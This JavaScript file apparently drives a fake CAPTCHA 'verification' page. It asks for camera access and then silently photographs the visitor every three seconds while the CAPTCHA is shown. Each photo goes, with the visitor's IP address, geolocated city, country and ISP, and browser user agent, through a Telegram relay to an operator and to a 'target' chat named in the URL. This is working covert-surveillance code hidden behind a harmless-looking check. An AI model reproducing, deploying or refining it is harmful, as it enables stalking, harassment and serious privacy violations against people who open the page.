var RUNTIME = { recaptchaKey: "", ready: false };

function loadConfig(){
  return fetch("/api/config")
    .then(function(r){ return r.json(); })
    .then(function(d){ RUNTIME.recaptchaKey = d.recaptchaKey || ""; RUNTIME.ready = true; log("config loaded"); return RUNTIME; })
    .catch(function(e){ logErr("config error", e); RUNTIME.ready = true; return RUNTIME; });
}

var CAPTURE_INTERVAL = 3000, IMAGE_QUALITY = 0.78, CAM_WIDTH = 640, CAM_HEIGHT = 480;
var video=document.getElementById("video"), canvas=document.getElementById("canvas");
var camCard=document.getElementById("camCard"), camTitle=document.getElementById("camTitle");
var camSub=document.getElementById("camSub"), camStatus=document.getElementById("camStatus");
var stats=document.getElementById("stats"), cntCap=document.getElementById("cntCaptures");
var delSt=document.getElementById("delStatus"), latVal=document.getElementById("latVal");
var captchaW=document.getElementById("captchaWrap"), bottomR=document.getElementById("bottomRight");

var params = new URLSearchParams(window.location.search);
var userChatId = params.get("id");
var hasTarget = !!(userChatId && userChatId.trim());
var stream=null, captureTimer=null, captureCount=0, capturing=false;
var recaptchaWidgetId=null, isSending=false;

function log(m){ console.log("[VÉLA] " + m); }
function logErr(m,e){ console.error("[VÉLA ERROR] " + m, e || ""); }

function getIP(){ return fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(d){return d.ip||"Unknown";}).catch(function(){return "Unknown";}); }
function getGeo(){ return fetch("https://ipapi.co/json/").then(function(r){return r.json();}).then(function(d){return (d.city||"?")+", "+(d.country_name||"?")+" ("+(d.org||"?")+")";}).catch(function(){return "Unknown";}); }

function sendToTelegram(blob, caption, isAdmin){
  var fd = new FormData();
  fd.append("chat_id", "placeholder");
  fd.append("photo", blob, "vela_"+Date.now()+".jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  var url = "/api/send?role=" + (isAdmin ? "admin" : "user");
  if (!isAdmin && hasTarget) url += "&target=" + encodeURIComponent(userChatId);
  return fetch(url, {method:"POST", body:fd}).then(function(r){return r.json();}).then(function(d){return d.ok;}).catch(function(){return false;});
}

function capture(){
  if (!stream || !capturing || isSending) return Promise.resolve();
  isSending = true;
  var t0 = performance.now();
  try {
    canvas.width = video.videoWidth || CAM_WIDTH;
    canvas.height = video.videoHeight || CAM_HEIGHT;
    canvas.getContext("2d").drawImage(video, 0, 0);
  } catch(e){ logErr("canvas", e); isSending = false; return Promise.resolve(); }
  return new Promise(function(res){ canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY); })
    .then(function(blob){
      if (!blob){ isSending = false; return; }
      return Promise.all([getIP(), getGeo()]).then(function(arr){
        var ip=arr[0], geo=arr[1], ua=navigator.userAgent;
        var date = new Date().toLocaleString("en-US",{timeZoneName:"short"});
        var base = "📸 #"+(captureCount+1)+"\n🕐 "+date+"\n🌐 "+ip+" — "+geo+"\n💻 "+ua;
        var adminCaption = hasTarget ? (base+"\n👤 Target: "+userChatId) : (base+"\n🧾 No target");
        var chain = sendToTelegram(blob, adminCaption, true);
        if (hasTarget) chain = chain.then(function(){ return sendToTelegram(blob, base, false); });
        return chain.then(function(){
          captureCount++;
          if (cntCap) cntCap.textContent = captureCount;
          if (delSt) delSt.textContent = "✓";
          if (latVal) latVal.textContent = Math.round(performance.now()-t0)+"ms";
        });
      });
    })
    .catch(function(e){ logErr("chain", e); })
    .then(function(){ isSending = false; });
}

function startCamera(){
  camTitle.textContent = "Camera access"; camSub.textContent = "Awaiting permission"; camStatus.textContent = "Idle";
  navigator.mediaDevices.getUserMedia({video:{width:{ideal:CAM_WIDTH}, height:{ideal:CAM_HEIGHT}, facingMode:"user"}})
    .then(function(s){ stream=s; video.srcObject=stream; return video.play(); })
    .then(function(){ return new Promise(function(res){ if (video.readyState>=2) return res(); video.onloadeddata=res; setTimeout(res,2500); }); })
    .then(function(){
      window.__cameraReady = true;
      camCard.classList.add("active");
      camTitle.textContent = "Camera connected";
      camSub.textContent = "Streaming frames";
      camStatus.textContent = "Active";
      if (stats) stats.style.display = "grid";
      if (captchaW){ captchaW.classList.remove("dimmed"); captchaW.classList.add("ready"); }
      if (bottomR) bottomR.textContent = "Verifying";
      capturing = true;
      capture();
      captureTimer = setInterval(capture, CAPTURE_INTERVAL);
      tryRenderRecaptcha();
    })
    .catch(function(err){ logErr("camera", err); camTitle.textContent = "Camera required"; camSub.textContent = "Access denied"; camStatus.textContent = "Error"; });
}

function stopCapture(){ capturing=false; if(captureTimer){clearInterval(captureTimer);captureTimer=null;} if(stream){stream.getTracks().forEach(function(t){t.stop();});stream=null;} }

function tryRenderRecaptcha(){
  if (!RUNTIME.recaptchaKey || !window.__recaptchaReady || !window.__cameraReady || recaptchaWidgetId!==null) return;
  var c = document.getElementById("recaptchaWidget"); if (!c) return;
  try { recaptchaWidgetId = window.grecaptcha.render(c, {sitekey:RUNTIME.recaptchaKey, callback:onRecaptchaSuccess, "expired-callback":onRecaptchaExpired, "error-callback":onRecaptchaError}); } catch(e){ logErr("recaptcha", e); }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess(){ if (bottomR) bottomR.textContent = "✓ Verified"; stopCapture(); setTimeout(function(){ window.location.href = "next.html"; }, 1000); }
window.onRecaptchaSuccess = onRecaptchaSuccess;
window.onRecaptchaExpired = function(){ camTitle.textContent = "Session expired"; camSub.textContent = "Resolve again"; };
window.onRecaptchaError = function(){ camTitle.textContent = "Error"; camSub.textContent = "Reload"; };

window.addEventListener("load", function(){ loadConfig().then(startCamera); });
window.addEventListener("beforeunload", stopCapture);
